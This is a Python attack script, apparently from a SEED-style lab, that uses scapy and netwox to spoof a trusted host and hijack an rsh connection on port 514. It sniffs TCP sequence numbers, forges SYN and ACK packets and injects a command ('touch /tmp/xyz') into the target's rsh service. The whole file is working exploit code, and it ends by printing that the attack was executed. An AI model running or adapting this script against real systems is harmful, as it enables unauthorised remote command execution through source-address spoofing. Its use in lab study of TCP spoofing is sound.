#!/usr/bin/python
from scapy.all import *
import os
import threading
import time
 
x=0
y=0
z=0
cmd_1 = 'sudo netwox 40 --tcp-syn --ip4-src 10.0.2.15 --ip4-dst 10.0.2.4 --tcp-src 1023 --tcp-dst 514 '
cmd_2 = 'sudo netwox 40 --tcp-ack --ip4-src 10.0.2.15 --ip4-dst 10.0.2.4 --tcp-src 1023 --tcp-dst 514 '
cmd_3 = 'sudo netwox 40 --tcp-syn --tcp-ack --ip4-src 10.0.2.15 --ip4-dst 10.0.2.4 --tcp-src 9090 --tcp-dst 1023 '
data = "9090\x00seed\x00seed\x00touch /tmp/xyz\x00".encode("utf-8").hex()

def syn_1(pkt):
        global x
        x=pkt[TCP].seq
        x = x + 1
 
def syn_ack_1(pkt):
        global y
        y=pkt[TCP].seq
        y = y + 1
 
def syn_2(pkt):
        global z
        z=pkt[TCP].seq
        z = z + 1
 
def run_syn():
    time.sleep(1) # Gives time for sniffing to begin
    os.system(cmd_1) # Executes the first packet spoof

def run_plain_ack():
    time.sleep(1)
    cmd = cmd_2 + '--tcp-acknum ' + str(y) + ' --tcp-seqnum ' + str(x)
    os.system(cmd)
    run_data_ack()
    run_syn_ack()
 
def run_data_ack():
    time.sleep(2)
    cmd = cmd_2 + '--tcp-acknum ' + str(y) + ' --tcp-seqnum ' + str(x) + ' --tcp-data ' + str(data)
    os.system(cmd)

def run_syn_ack():
    time.sleep(3) # Gives time for sniffing to begin
    cmd = cmd_3 + ' --tcp-acknum ' + str(z)
    os.system(cmd) # Executes the second packet spoof

def sniff_1():
    # Sniff for the SYN packet the attacker sends
    sniff(count=1,filter='tcp and (src host 10.0.2.15 and dst port 514)',prn=syn_1)
 
def sniff_2():
    # Sniff for the SYN/ACK packet the server sends
    sniff(count=1,filter='tcp and (src host 10.0.2.4 and dst port 1023)',prn=syn_ack_1)
 
def sniff_3():
    # Sniff for the SYN packet the server sends
    sniff(count=1,filter='tcp and (src host 10.0.2.4 and dst port 9090)',prn=syn_2)

def main():
        print("Sniffing Traffic...\n\n")
 
        # Initialize threads 
        command1Thread = threading.Thread(target=run_syn)
        command2Thread = threading.Thread(target=run_plain_ack)
        sniff1Thread = threading.Thread(target=sniff_1)
        sniff2Thread = threading.Thread(target=sniff_2)
        sniff3Thread = threading.Thread(target=sniff_3)
        
        # Run the first command and get x and y
        command1Thread.start()
        sniff1Thread.start()
        sniff2Thread.start()
        command1Thread.join()
        
        # Run the next commands to send the malicious data and get z
        command2Thread.start()
        sniff3Thread.start()
        command2Thread.join()
        sniff1Thread.join()
        sniff2Thread.join()
        sniff3Thread.join()
        print("\n\nAttack executed.")
 
if __name__ == "__main__":
        main()
